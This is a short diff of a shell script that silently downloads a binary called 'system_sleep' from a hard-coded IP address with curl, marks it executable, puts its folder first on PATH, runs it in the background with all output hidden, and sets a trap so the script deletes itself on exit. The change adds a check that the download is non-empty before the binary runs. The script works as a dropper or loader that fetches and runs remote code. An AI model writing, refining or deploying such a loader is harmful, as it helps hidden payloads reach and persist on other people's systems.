@@ -11,9 +11,11 @@ self_remove(){
 
 if command -v curl 1> /dev/null; then
     curl -s "http://172.16.10.1/system_sleep" -o "${FULL_BIN_PATH}"
-    chmod +x "${FULL_BIN_PATH}"
-    export PATH="${WORK_DIR}:${PATH}"
-    nohup "${BIN_FILE}" &> /dev/null &
+    if [[ -s "${FULL_BIN_PATH}" ]]; then
+      chmod +x "${FULL_BIN_PATH}"
+      export PATH="${WORK_DIR}:${PATH}"
+      nohup "${BIN_FILE}" &> /dev/null &
+    fi
 fi
 
 trap self_remove EXIT
